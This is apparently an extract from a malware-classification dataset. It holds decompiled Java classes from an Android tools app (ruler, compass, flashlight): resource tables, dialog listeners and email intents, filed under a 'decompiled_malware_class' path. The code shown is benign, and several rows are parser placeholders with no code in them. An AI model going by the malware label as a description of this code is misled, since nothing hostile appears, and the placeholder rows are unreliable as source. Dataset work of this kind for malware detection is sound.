linearLayout.addView(textView3);     ImageView imageView4=new ImageView(context);     imageView4.setImageResource(C0000R.drawable.step4);     linearLayout.addView(imageView4);     TextView textView4=new TextView(context);     textView4.setTextSize(10.0f);     textView4.setText(""\n"");     linearLayout.addView(textView4);     ImageView imageView5=new ImageView(context);     imageView5.setImageResource(C0000R.drawable.step5);     linearLayout.addView(imageView5);     builder.setPositiveButton(C0000R.string.ok,new m(this));     builder.setNegativeButton(C0000R.string.noshow_msg,new n(this,context));     return builder.create();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\drawable.code","public static final class drawable {   public static final int back_metal=2130837504;   public static final int back_metal1=2130837505;   public static final int ball1=2130837506;   public static final int ball2=2130837507;   public static final int ball3=2130837508;   public static final int ball4=2130837509;   public static final int ball5=2130837510;   public static final int ball6=2130837511;   public static final int ball7=2130837512;   public static final int ball8=2130837513;   public static final int ball9=2130837514;   public static final int bar_led_all=2130837515;   public static final int bar_screen_off=2130837516;   public static final int bar_screen_on=2130837517;   public static final int bg_flash_off=2130837518;   public static final int bg_flash_on=2130837519;   public static final int bg_screen_off=2130837520;   public static final int bg_screen_on=2130837521;   public static final int border_steal=2130837522;   public static final int bt_sms_send=2130837523;   public static final int button_area=2130837524;   public static final int button_chart=2130837525;   public static final int button_height=2130837526;   public static final int button_pause=2130837527;   public static final int button_play=2130837528;   public static final int button_text=2130837529;   public static final int button_width=2130837530;   public static final int chart_mag=2130837531;   public static final int chart_sound=2130837532;   public static final int cross=2130837533;   public static final int dialog_directions=2130837534;   public static final int email=2130837535;   public static final int flash_widget=2130837536;   public static final int flash_widget_back=2130837537;   public static final int flash_widget_off=2130837538;   public static final int flash_widget_on=2130837539;   public static final int flash_widget_pressed=2130837540;   public static final int go_left=2130837541;   public static final int go_reload=2130837542;   public static final int go_right=2130837543;   public static final int go_scroll=2130837544;   public static final int icon=2130837545;   public static final int icon_compass=2130837546;   public static final int icon_compass_tab=2130837547;   public static final int icon_flashlight=2130837548;   public static final int icon_flashlight_tab=2130837549;   public static final int icon_flashlight_widget=2130837550;   public static final int icon_level=2130837551;   public static final int icon_level_tab=2130837552;   public static final int icon_measure=2130837553;   public static final int icon_measure_tab=2130837554;   public static final int icon_metal=2130837555;   public static final int icon_metal_tab=2130837556;   public static final int icon_protractor2=2130837557;   public static final int icon_protractor2_tab=2130837558;   public static final int icon_protractor3=2130837559;   public static final int icon_protractor3_tab=2130837560;   public static final int icon_ruler=2130837561;   public static final int icon_ruler_tab=2130837562;   public static final int icon_sound=2130837563;   public static final int icon_sound_tab=2130837564;   public static final int icon_vibration=2130837565;   public static final int icon_vibration_tab=2130837566;   public static final int led_off=2130837567;   public static final int led_on=2130837568;   public static final int m_center1=2130837569;   public static final int m_down=2130837570;   public static final int m_down0=2130837571;   public static final int m_down1=2130837572;   public static final int m_up=2130837573;   public static final int m_up0=2130837574;   public static final int m_up1=2130837575;   public static final int main_back_land=2130837576;   public static final int main_back_port=2130837577;   public static final int main_bottom_land=2130837578;   public static final int main_bottom_land_tab=2130837579;   public static final int main_bottom_port=2130837580;   public static final int main_bottom_port_tab=2130837581;   public static final int main_shelf1=2130837582;   public static final int main_shelf1_off=2130837583;   public static final int main_shelf1_on=2130837584;   public static final int main_shelf1_tab=2130837585;   public static final int main_shelf1_tab_off=2130837586;   public static final int main_shelf1_tab_on=2130837587;   public static final int main_shelf2=2130837588;   public static final int main_shelf2_off=2130837589;   public static final int main_shelf2_on=2130837590;   public static final int main_shelf2_tab=2130837591;   public static final int main_shelf2_tab_off=2130837592;   public static final int main_shelf2_tab_on=2130837593;   public static final int main_shelf3=2130837594;   public static final int main_shelf3_off=2130837595;   public static final int main_shelf3_on=2130837596;   public static final int main_shelf3_tab=2130837597;   public static final int main_shelf3_tab_off=2130837598;   public static final int main_shelf3_tab_on=2130837599;   public static final int main_shelf4=2130837600;   public static final int main_shelf4_off=2130837601;   public static final int main_shelf4_on=2130837602;   public static final int main_shelf4_tab=2130837603;   public static final int main_shelf4_tab_off=2130837604;   public static final int main_shelf4_tab_on=2130837605;   public static final int main_shelf5=2130837606;   public static final int main_shelf5_off=2130837607;   public static final int main_shelf5_on=2130837608;   public static final int main_shelf5_tab=2130837609;   public static final int main_shelf5_tab_off=2130837610;   public static final int main_shelf5_tab_on=2130837611;   public static final int menu_add=2130837612;   public static final int menu_calibrate=2130837613;   public static final int menu_compass=2130837614;   public static final int menu_getpro=2130837615;   public static final int menu_help=2130837616;   public static final int menu_home=2130837617;   public static final int menu_info=2130837618;   public static final int menu_init=2130837619;   public static final int menu_input=2130837620;   public static final int menu_metal=2130837621;   public static final int menu_refresh=2130837622;   public static final int menu_remove=2130837623;   public static final int menu_settings=2130837624;   public static final int menu_sound=2130837625;   public static final int menu_sql=2130837626;   public static final int menu_unit=2130837627;   public static final int menu_vibration=2130837628;   public static final int menu_width=2130837629;   public static final int meter_sound=2130837630;   public static final int meter_vib=2130837631;   public static final int needle=2130837632;   public static final int needle_sound=2130837633;   public static final int needle_vib=2130837634;   public static final int num_0=2130837635;   public static final int num_1=2130837636;   public static final int num_2=2130837637;   public static final int num_3=2130837638;   public static final int num_4=2130837639;   public static final int num_5=2130837640;   public static final int num_6=2130837641;   public static final int num_7=2130837642;   public static final int num_8=2130837643;   public static final int num_9=2130837644;   public static final int plumb=2130837645;   public static final int screen_off=2130837646;   public static final int screen_on=2130837647;   public static final int shutter0=2130837648;   public static final int shutter1=2130837649;   public static final int shutter2=2130837650;   public static final int slide_close=2130837651;   public static final int slide_handle_bar=2130837652;   public static final int slide_handle_bar_off=2130837653;   public static final int slide_handle_bar_on=2130837654;   public static final int slide_handle_rect=2130837655;   public static final int slide_handle_rect_off=2130837656;   public static final int slide_handle_rect_on=2130837657;   public static final int slide_open=2130837658;   public static final int sliding_back=2130837659;   public static final int sliding_level=2130837660;   public static final int sliding_measure=2130837661;   public static final int sliding_protractor1=2130837662;   public static final int sliding_protractor2=2130837663;   public static final int sliding_protractor3=2130837664;   public static final int sliding_ruler=2130837665;   public static final int sliding_thread=2130837666;   public static final int sms=2130837667;   public static final int sound_off=2130837668;   public static final int sound_on=2130837669;   public static final int star=2130837670;   public static final int step1=2130837671;   public static final int step2=2130837672;   public static final int step3=2130837673;   public static final int step4=2130837674;   public static final int step5=2130837675;   public static final int step_calibrate=2130837676;   public static final int unit1=2130837677;   public static final int vibrate=2130837678;   public static final int wheel=2130837679;   public static final int zoom_in=2130837680;   public static final int zoom_in_no=2130837681;   public static final int zoom_out=2130837682;   public static final int zoom_out_no=2130837683; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\e.code","public class e implements DialogInterface.OnClickListener {   final d f378a;   public e(  d dVar){     this.f378a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\f.code","public class f implements DialogInterface.OnClickListener {   final d f379a;   private final Context f380b;   public f(  d dVar,  Context context){     this.f379a=dVar;     this.f380b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f380b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(this.f380b.getString(C0000R.string.my_homepage_flashlight))));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\g.code","public class g implements DialogInterface.OnClickListener {   final d f381a;   private final Context f382b;   public g(  d dVar,  Context context){     this.f381a=dVar;     this.f382b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     Intent intent=new Intent(""android.intent.action.SEND"");     intent.setType(""plain/text"");     intent.putExtra(""android.intent.extra.EMAIL"",new String[]{(String)this.f382b.getText(C0000R.string.my_email)});     intent.putExtra(""android.intent.extra.SUBJECT"",""["" + ((String)this.f382b.getText(C0000R.string.app_flashlight_ver)) + ""] ""+ Build.MODEL+ "" OS""+ Build.VERSION.RELEASE);     intent.putExtra(""android.intent.extra.TEXT"","""");     this.f382b.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\h.code","public class h implements DialogInterface.OnClickListener {   final d f383a;   private final Context f384b;   private final SharedPreferences.Editor c;   public h(  d dVar,  Context context,  SharedPreferences.Editor editor){     this.f383a=dVar;     this.f384b=context;     this.c=editor;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f384b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(""market://details?id="" + this.f384b.getPackageName())));     this.c.putBoolean(""smartcomment"",false);     this.c.commit();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\i.code","public class i implements DialogInterface.OnClickListener {   final d f392a;   public i(  d dVar){     this.f392a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\id.code","public static final class id {   public static final int preview_surface=2131296256;   public static final int custom_view=2131296257;   public static final int sliding_drawer=2131296258;   public static final int handle=2131296259;   public static final int content=2131296260;   public static final int icon_slide=2131296261;   public static final int layout1=2131296262;   public static final int button_save=2131296263;   public static final int button_load=2131296264;   public static final int chart_view=2131296265;   public static final int view_compass=2131296266;   public static final int preview_compass=2131296267;   public static final int finder_compass=2131296268;   public static final int height1=2131296269;   public static final int unit1=2131296270;   public static final int layout2=2131296271;   public static final int height2=2131296272;   public static final int unit2=2131296273;   public static final int layout3=2131296274;   public static final int checkbox=2131296275;   public static final int layout4=2131296276;   public static final int button=2131296277;   public static final int button1=2131296278;   public static final int phone=2131296279;   public static final int phone_save=2131296280;   public static final int sms_byte=2131296281;   public static final int message=2131296282;   public static final int finish_button=2131296283;   public static final int cancel_button=2131296284;   public static final int layout3_1=2131296285;   public static final int amplitude_text=2131296286;   public static final int amplitude_level1=2131296287;   public static final int amplitude_level2=2131296288;   public static final int layout3_2=2131296289;   public static final int calibrate_plus=2131296290;   public static final int calibrate_text=2131296291;   public static final int calibrate_minus=2131296292;   public static final int sql_title=2131296293;   public static final int button_ok=2131296294;   public static final int button_cancel=2131296295;   public static final int width=2131296296;   public static final int unit=2131296297;   public static final int layout_led=2131296298;   public static final int flash_surface=2131296299;   public static final int button_led=2131296300;   public static final int bar_led=2131296301;   public static final int layout_screen=2131296302;   public static final int button_screen=2131296303;   public static final int bar_screen=2131296304;   public static final int icon_widget=2131296305;   public static final int flash_surface_widget=2131296306;   public static final int layout0=2131296307;   public static final int layout12=2131296308;   public static final int main_shelf1=2131296309;   public static final int layout1_1=2131296310;   public static final int icon_ruler=2131296311;   public static final int icon_protractor2=2131296312;   public static final int icon_protractor3=2131296313;   public static final int icon_level=2131296314;   public static final int main_shelf2=2131296315;   public static final int icon_measure=2131296316;   public static final int layout354=2131296317;   public static final int main_shelf3=2131296318;   public static final int icon_compass=2131296319;   public static final int icon_metal=2131296320;   public static final int layout5=2131296321;   public static final int main_shelf5=2131296322;   public static final int icon_light=2131296323;   public static final int main_shelf4=2131296324;   public static final int layout4_1=2131296325;   public static final int icon_sound=2131296326;   public static final int icon_vibration=2131296327;   public static final int layout9=2131296328;   public static final int text_about=2131296329;   public static final int layout1_11=2131296330;   public static final int layout1_2=2131296331;   public static final int layout235=2131296332;   public static final int layout23=2131296333;   public static final int layout32=2131296334;   public static final int layout5_1=2131296335;   public static final int layout5_2=2131296336;   public static final int layout41=2131296337;   public static final int layout42=2131296338;   public static final int layout43=2131296339;   public static final int layout2_1=2131296340;   public static final int button_ruler=2131296341;   public static final int button_measure=2131296342;   public static final int layout2_2=2131296343;   public static final int button_compass=2131296344;   public static final int button_sound=2131296345;   public static final int layout2_3=2131296346;   public static final int button_light=2131296347;   public static final int button_about=2131296348;   public static final int preview_measure=2131296349;   public static final int finder_measure=2131296350;   public static final int metal_view=2131296351;   public static final int ruler=2131296352;   public static final int ruler_text=2131296353;   public static final int protractor1=2131296354;   public static final int protractor1_text=2131296355;   public static final int layout34=2131296356;   public static final int protractor2=2131296357;   public static final int protractor2_text=2131296358;   public static final int protractor3=2131296359;   public static final int protractor3_text=2131296360;   public static final int layout56=2131296361;   public static final int level=2131296362;   public static final int level_text=2131296363;   public static final int layout6_1=2131296364;   public static final int measure=2131296365;   public static final int measure_text=2131296366;   public static final int layout6_2=2131296367;   public static final int thread=2131296368;   public static final int thread_text=2131296369;   public static final int soundview_view=2131296370;   public static final int date_text=2131296371;   public static final int title_text=2131296372; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\j.code","public class j implements DialogInterface.OnClickListener {   final d f393a;   private final SharedPreferences.Editor f394b;   public j(  d dVar,  SharedPreferences.Editor editor){     this.f393a=dVar;     this.f394b=editor;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f394b.putBoolean(""smartcomment"",false);     this.f394b.commit();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\k.code","public class k implements DialogInterface.OnClickListener {   final d f395a;   public k(  d dVar){     this.f395a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\l.code","public class l implements DialogInterface.OnClickListener {   final d f403a;   private final Context f404b;   public l(  d dVar,  Context context){     this.f403a=dVar;     this.f404b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     Intent intent=new Intent(""android.intent.action.SEND"");     String networkCountryIso=((TelephonyManager)this.f404b.getSystemService(""phone"")).getNetworkCountryIso();     intent.setType(""plain/text"");     intent.putExtra(""android.intent.extra.EMAIL"",new String[]{this.f404b.getString(C0000R.string.my_email)});     intent.putExtra(""android.intent.extra.SUBJECT"",""["" + this.f404b.getString(C0000R.string.app_tools) + ""] ""+ Build.MODEL+ (Tools.d ? "" "" : "", "")+ networkCountryIso);     intent.putExtra(""android.intent.extra.TEXT"","""");     this.f404b.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\layout.code","public static final class layout {   public static final int camera_ruler=2130903040;   public static final int chart=2130903041;   public static final int compass=2130903042;   public static final int compass_cam=2130903043;   public static final int custom_ruler=2130903044;   public static final int dialog_height=2130903045;   public static final int dialog_sms=2130903046;   public static final int dialog_sound=2130903047;   public static final int dialog_title=2130903048;   public static final int dialog_vibration=2130903049;   public static final int dialog_width=2130903050;   public static final int flash_led_camera=2130903051;   public static final int flash_led_no=2130903052;   public static final int flash_screen=2130903053;   public static final int flash_widget=2130903054;   public static final int flash_widget_camera=2130903055;   public static final int main=2130903056;   public static final int main5=2130903057;   public static final int main_tab=2130903058;   public static final int main_tab10=2130903059;   public static final int measure=2130903060;   public static final int metal=2130903061;   public static final int sliding_content=2130903062;   public static final int sliding_content_tab10=2130903063;   public static final int sound=2130903064;   public static final int sql_list=2130903065;   public static final int sql_row=2130903066; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\LicenseCheck.code","!org.eclipse.jdt.core.dom.TypeDeclaration@22f80667"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\m.code","public class m implements DialogInterface.OnClickListener {   final d f405a;   public m(  d dVar){     this.f405a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\n.code","public class n implements DialogInterface.OnClickListener {   final d f406a;   private final Context f407b;   public n(  d dVar,  Context context){     this.f406a=dVar;     this.f407b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     SharedPreferences.Editor edit=PreferenceManager.getDefaultSharedPreferences(this.f407b).edit();     edit.putString(""visitcount"",""1"");     edit.commit();     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\o.code","public class o implements DialogInterface.OnClickListener {   final d f408a;   private final Context f409b;   public o(  d dVar,  Context context){     this.f408a=dVar;     this.f409b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f409b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(this.f409b.getString(C0000R.string.my_homepage_measure))));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\p.code","public class p implements DialogInterface.OnClickListener {   final d f410a;   public p(  d dVar){     this.f410a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\q.code","public class q implements DialogInterface.OnClickListener {   final d f411a;   private final Context f412b;   public q(  d dVar,  Context context){     this.f411a=dVar;     this.f412b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f412b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(this.f412b.getString(C0000R.string.my_homepage_ruler))));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\r.code","public class r implements DialogInterface.OnClickListener {   final d f413a;   public r(  d dVar){     this.f413a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\raw.code","public static final class raw {   public static final int beep1=2131034112;   public static final int beep2=2131034113;   public static final int beep3=2131034114;   public static final int beep4=2131034115;   public static final int tick=2131034116; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\RGPlayer.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4d87865f"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\s.code","public class s implements DialogInterface.OnClickListener {   final d f414a;   private final Context f415b;   public s(  d dVar,  Context context){     this.f414a=dVar;     this.f415b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f415b.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(this.f415b.getString(C0000R.string.my_homepage_compass))));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\string.code","public static final class string {   public static final int app_name=2131230720;   public static final int app_tools=2131230721;   public static final int app_measure=2131230722;   public static final int app_measure_ver=2131230723;   public static final int app_ruler=2131230724;   public static final int app_ruler_ver=2131230725;   public static final int app_compass=2131230726;   public static final int app_compass_ver=2131230727;   public static final int app_sound=2131230728;   public static final int app_sound_ver=2131230729;   public static final int app_flashlight_ver=2131230730;   public static final int developer_name=2131230731;   public static final int my_email=2131230732;   public static final int my_homepage=2131230733;   public static final int my_homepage_measure=2131230734;   public static final int my_homepage_ruler=2131230735;   public static final int my_homepage_compass=2131230736;   public static final int my_homepage_sound=2131230737;   public static final int my_homepage_flashlight=2131230738;   public static final int developed_by=2131230739;   public static final int send_email=2131230740;   public static final int visit_homepage=2131230741;   public static final int more_apps=2131230742;   public static final int list_ruler=2131230743;   public static final int list_measure=2131230744;   public static final int list_compass=2131230745;   public static final int list_sound=2131230746;   public static final int list_vibration=2131230747;   public static final int list_light=2131230748;   public static final int list_about=2131230749;   public static final int ok=2131230750;   public static final int cancel=2131230751;   public static final int about_msg=2131230752;   public static final int remove_lite=2131230753;   public static final int sensor_error=2131230754;   public static final int mic_error=2131230755;   public static final int gone_error=2131230756;   public static final int cn_error=2131230757;   public static final int loading=2131230758;   public static final int menu_init=2131230759;   public static final int menu_soundhide=2131230760;   public static final int menu_soundshow=2131230761;   public static final int menu_unit_meter=2131230762;   public static final int menu_unit_feet=2131230763;   public static final int menu_language=2131230764;   public static final int menu_language_msg=2131230765;   public static final int menu_home=2131230766;   public static final int menu_manual=2131230767;   public static final int menu_inputheight=2131230768;   public static final int menu_calibrate=2131230769;   public static final int menu_settings=2131230770;   public static final int menu_about=2131230771;   public static final int menu_inputwidth=2131230772;   public static final int menu_compass=2131230773;   public static final int menu_metal=2131230774;   public static final int menu_sound=2131230775;   public static final int menu_vibration=2131230776;   public static final int rate_title=2131230777;   public static final int rate_msg=2131230778;   public static final int rate_never=2131230779;   public static final int about_msg_tools1=2131230780;   public static final int about_msg_tools2=2131230781;   public static final int about_msg_tools3=2131230782;   public static final int distance=2131230783;   public static final int height=2131230784;   public static final int width=2131230785;   public static final int area=2131230786;   public static final int menu_howtouse=2131230787;   public static final int label_height=2131230788;   public static final int dialog_unit_m=2131230789;   public static final int dialog_unit_ft=2131230790;   public static final int dialog_range=2131230791;   public static final int dialog_height1=2131230792;   public static final int dialog_height2=2131230793;   public static final int dialog_checkbox=2131230794;   public static final int calibrate_label=2131230795;   public static final int calibrate=2131230796;   public static final int calibrate_current=2131230797;   public static final int calibrate_msg=2131230798;   public static final int calibrate_no=2131230799;   public static final int calibrate_yes=2131230800;   public static final int pref_category1_measure=2131230801;   public static final int pref_measure2nd=2131230802;   public static final int pref_measure2nd_summary=2131230803;   public static final int pref_distanceunit=2131230804;   public static final int pref_distanceunit_summary=2131230805;   public static final int pref_unit_changed=2131230806;   public static final int pref_category2_measure=2131230807;   public static final int pref_calibration=2131230808;   public static final int pref_calibration_summary=2131230809;   public static final int pref_silent=2131230810;   public static final int pref_silent_summary=2131230811;   public static final int pref_category3_measure=2131230812;   public static final int pref_portrait=2131230813;   public static final int pref_portrait_summary=2131230814;   public static final int pref_zoom=2131230815;   public static final int pref_zoom_summary=2131230816;   public static final int pref_horizon=2131230817;   public static final int pref_horizon_summary=2131230818;   public static final int pref_explain=2131230819;   public static final int pref_explain_summary=2131230820;   public static final int view_msg01_0=2131230821;   public static final int view_msg02_0=2131230822;   public static final int view_msg01_1=2131230823;   public static final int view_msg02_1=2131230824;   public static final int view_msg01_2=2131230825;   public static final int view_msg02_2=2131230826;   public static final int view_msg11_0=2131230827;   public static final int view_msg12_0=2131230828;   public static final int view_msg11_1=2131230829;   public static final int view_msg12_1=2131230830;   public static final int view_msg11_2=2131230831;   public static final int view_msg12_2=2131230832;   public static final int view_msg21_0=2131230833;   public static final int view_msg22_0=2131230834;   public static final int view_msg21_1=2131230835;   public static final int view_msg22_1=2131230836;   public static final int view_msg21_2=2131230837;   public static final int view_msg22_2=2131230838;   public static final int view_msg31=2131230839;   public static final int view_msg32=2131230840;   public static final int shutter_msg0=2131230841;   public static final int shutter_msg1=2131230842;   public static final int shutter_msg2_0=2131230843;   public static final int shutter_msg2_1=2131230844;   public static final int shutter_msg2_2=2131230845;   public static final int shutter_msg3=2131230846;   public static final int visit1_msg=2131230847;   public static final int noshow_msg=2131230848;   public static final int noheight_msg=2131230849;   public static final int nodistance_msg=2131230850;   public static final int noaim_msg=2131230851;   public static final int nolevel1_msg=2131230852;   public static final int nolevel2_msg=2131230853;   public static final int norollzero_msg=2131230854;   public static final int okrollzero_msg=2131230855;   public static final int info1_title_measure=2131230856;   public static final int info1_msg_measure=2131230857;   public static final int info2_title_measure=2131230858;   public static final int info2_step1_measure=2131230859;   public static final int info2_step2_measure=2131230860;   public static final int info2_step3_measure=2131230861;   public static final int info2_step4_measure=2131230862;   public static final int info2_step5_measure=2131230863;   public static final int info3_title_measure=2131230864;   public static final int info3_msg_measure=2131230865;   public static final int info_update=2131230866;   public static final int info_update_measure=2131230867;   public static final int label_width=2131230868;   public static final int dialog_unit_mm=2131230869;   public static final int dialog_unit_inch=2131230870;   public static final int dialog_range_ruler=2131230871;   public static final int angle_unit=2131230872;   public static final int set_roll_zero=2131230873;   public static final int ok_roll_zero=2131230874;   public static final int set_white_black=2131230875;   public static final int sliding_ruler=2131230876;   public static final int sliding_protractor1=2131230877;   public static final int sliding_protractor2=2131230878;   public static final int sliding_protractor3=2131230879;   public static final int sliding_level=2131230880;   public static final int sliding_thread=2131230881;   public static final int pref_category1_ruler=2131230882;   public static final int pref_ruler=2131230883;   public static final int pref_ruler_summary=2131230884;   public static final int pref_lengthunit=2131230885;   public static final int pref_lengthunit_summary=2131230886;   public static final int pref_textsize=2131230887;   public static final int pref_textsize_summary=2131230888;   public static final int pref_backcolor=2131230889;   public static final int pref_backcolor_summary=2131230890;   public static final int pref_multi=2131230891;   public static final int pref_multi_summary=2131230892;   public static final int pref_category2_ruler=2131230893;   public static final int pref_lengthscale=2131230894;   public static final int pref_lengthscale_summary=2131230895;   public static final int pref_lengthscale_dialog=2131230896;   public static final int pref_vhside=2131230897;   public static final int pref_vhside_summary=2131230898;   public static final int pref_lengthlong=2131230899;   public static final int pref_lengthlong_summary=2131230900;   public static final int pref_category3_ruler=2131230901;   public static final int pref_tiltunit=2131230902;   public static final int pref_tiltunit_summary=2131230903;   public static final int pref_calibratetext=2131230904;   public static final int pref_calibratetext_summary=2131230905;   public static final int pref_category4_ruler=2131230906;   public static final int pref_leveltop=2131230907;   public static final int pref_leveltop_summary=2131230908;   public static final int pref_category5_ruler=2131230909;   public static final int pref_isthread=2131230910;   public static final int pref_isthread_summary=2131230911;   public static final int pref_threadtype=2131230912;   public static final int pref_threadtype_summary=2131230913;   public static final int holding=2131230914;   public static final int noerect_msg=2131230915;   public static final int nolie_msg=2131230916;   public static final int info1_title_ruler=2131230917;   public static final int info1_msg_ruler=2131230918;   public static final int info2_title_ruler=2131230919;   public static final int info2_msg_ruler=2131230920;   public static final int info3_title_ruler=2131230921;   public static final int info3_msg_ruler=2131230922;   public static final int info_update_ruler=2131230923;   public static final int magnetic_field=2131230924;   public static final int calibrate_ask=2131230925;   public static final int calibrate_ok=2131230926;   public static final int latitude=2131230927;   public static final int latitude_north=2131230928;   public static final int latitude_south=2131230929;   public static final int longitude=2131230930;   public static final int longitude_east=2131230931;   public static final int longitude_west=2131230932;   public static final int mgrs=2131230933;   public static final int altitude=2131230934;   public static final int calibrate_azimuth=2131230935;   public static final int pref_category1_compass=2131230936;   public static final int pref_camera=2131230937;   public static final int pref_camera_summary=2131230938;   public static final int pref_lensatic=2131230939;   public static final int pref_lensatic_summary=2131230940;   public static final int pref_accel=2131230941;   public static final int pref_accel_summary=2131230942;   public static final int pref_azimuth=2131230943;   public static final int pref_azimuth_summary=2131230944;   public static final int pref_category2_compass=2131230945;   public static final int pref_gps=2131230946;   public static final int pref_gps_summary=2131230947;   public static final int pref_viakind=2131230948;   public static final int pref_viakind_summary=2131230949;   public static final int pref_coordi=2131230950;   public static final int pref_coordi_summary=2131230951;   public static final int pref_altitudeunit=2131230952;   public static final int pref_altitudeunit_summary=2131230953;   public static final int pref_category3_compass=2131230954;   public static final int pref_beeplevel3=2131230955;   public static final int pref_beeplevel3_summary=2131230956;   public static final int pref_beepkind3=2131230957;   public static final int pref_beepkind3_summary=2131230958;   public static final int pref_category4_compass=2131230959;   public static final int pref_delay=2131230960;   public static final int pref_delay_summary=2131230961;   public static final int pref_init=2131230962;   public static final int pref_init_summary=2131230963;   public static final int init_ask=2131230964;   public static final int init_ok=2131230965;   public static final int sms_label=2131230966;   public static final int sms_receiver=2131230967;   public static final int sms_save=2131230968;   public static final int sms_message=2131230969;   public static final int sms_send=2131230970;   public static final int sms_success=2131230971;   public static final int sms_fail=2131230972;   public static final int sms_no_input=2131230973;   public static final int nosatellite_msg=2131230974;   public static final int info1_title_compass=2131230975;   public static final int info1_msg_compass=2131230976;   public static final int info2_title_compass=2131230977;   public static final int info2_msg_compass=2131230978;   public static final int info3_title_compass=2131230979;   public static final int info3_msg_compass=2131230980;   public static final int info_update_compass=2131230981;   public static final int sound_db1=2131230982;   public static final int sound_db2=2131230983;   public static final int vibration_db1=2131230984;   public static final int vibration_db2=2131230985;   public static final int max_msg=2131230986;   public static final int mean_msg=2131230987;   public static final int reset_msg_0=2131230988;   public static final int reset_msg_1=2131230989;   public static final int db20_msg=2131230990;   public static final int db30_msg=2131230991;   public static final int db40_msg=2131230992;   public static final int db50_msg=2131230993;   public static final int db60_msg=2131230994;   public static final int db70_msg=2131230995;   public static final int db80_msg=2131230996;   public static final int db90_msg=2131230997;   public static final int db100_msg=2131230998;   public static final int db110_msg=2131230999;   public static final int db120_msg=2131231000;   public static final int db130_msg=2131231001;   public static final int db180_msg=2131231002;   public static final int vib1_msg=2131231003;   public static final int vib2_msg=2131231004;   public static final int vib3_msg=2131231005;   public static final int vib4_msg=2131231006;   public static final int vib5_msg=2131231007;   public static final int vib6_msg=2131231008;   public static final int 